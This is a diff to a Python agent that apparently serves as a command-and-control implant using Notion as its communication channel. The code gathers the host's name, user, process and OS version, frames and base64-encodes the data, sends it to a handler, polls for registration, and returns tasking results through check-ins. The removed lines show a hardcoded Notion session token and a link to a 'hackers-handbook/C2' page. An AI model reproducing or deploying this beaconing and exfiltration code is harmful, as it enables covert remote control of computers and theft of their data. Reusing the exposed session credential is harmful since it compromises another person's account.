@@ -9,11 +9,6 @@ import random
 import string
 import platform
 
-from notion.client import NotionClient
-
-# Obtain the `token_v2` value by inspecting your browser cookies on a logged-in (non-guest) session on Notion.so
-client = NotionClient(token_v2="v03%3AeyJhbGciOiJkaXIiLCJraWQiOiJwcm9kdWN0aW9uOnRva2VuLXYzOjIwMjQtMTEtMDciLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..joR3fZ74pzNBkk6EtcZz0A.a0maSXdJgZ5TK4pKc7Vtk8rhEeOqrjT61H1qbiZhSjOeUFfzTHXdJYZYUqk1N5s1D731CeuVQk7rXzMWsNvFTbmYKmO1ZOh1Bxx1FmE4DHXnwmCaCApuXXU0mF5ZuACgo5-WuVOaMPwpE-g1yo6Izd9mpW48kWxdS6dt8CVG7LwJquMHG8XbIt41UmpKAwkaqQ9BlUqWVNbG61znkFCtM7LL5y_bbORGXnzBmckbk9QSfSG1vWUtWA9QZ_Ydc9DCK2Tt69gILS1CZrPJHnkARrY2O3AjEGKUyf7El7BO0rRevcJT0Gx8suX5W5J3854PEU8uVpxV1Fk5swMs1TvlsNXW3yv07VWsfjDee9dreGM.VQV7cGLEh256WlZlf5_3gLBZIeJZy3Ic6P5oFux5IV8")
-page = client.get_block("https://www.notion.so/hackers-handbook/C2-31abce12527b8072a5b4de63618367d3")
 def get_random_string(length):
     # choose from all lowercase letter
     letters = string.ascii_lowercase
@@ -34,6 +29,7 @@ def register():
     global url
     global size
     global agentid
+    global registered
     global magic
                 # Register info:
                 #   - AgentID           : int [needed]
@@ -69,7 +65,7 @@ def register():
     #     "Sleep":5,
     # }
     registerdict = {
-    "AgentID": str(agentid),
+    "AgentID": str(agentid.decode('utf-8')),
     "Hostname": hostname,
     "Username": os.getlogin(),
     "Domain": "",
@@ -85,17 +81,19 @@ def register():
     "Process Name": "python",
     "OS Version": str(platform.version())
     }
-    registerblob = json.dumps(registerdict)
 
+    registerblob = json.dumps(registerdict)
     requestdict = {"task":"register","data":registerblob}
     requestblob = json.dumps(requestdict)
+    
     size = len(requestblob) + 12
     size_bytes = size.to_bytes(4, 'big')
     agentheader = size_bytes + magic + agentid
     res = sendData(base64.b64encode(agentheader+requestblob.encode('utf-8')).decode('utf-8'))
+    print("[+] Sent data: "+str(base64.b64encode(agentheader+requestblob.encode('utf-8')).decode('utf-8')))
     isregistered = False
     while not isregistered:
-        time.sleep(1)
+        time.sleep(5)
         res = getHandlerData()
         print("[+] Handler data: "+str(res))
         if res == "registered":
@@ -130,7 +128,6 @@ def checkin(data):
     print(f"Returning {len(data.strip())} bytes of data: " + data)
     sendData(base64.b64encode(agentheader+requestblob.encode('utf-8')).decode('utf-8'))
     return taskings
-    
 
 #register the agent
 while registered != "registered":
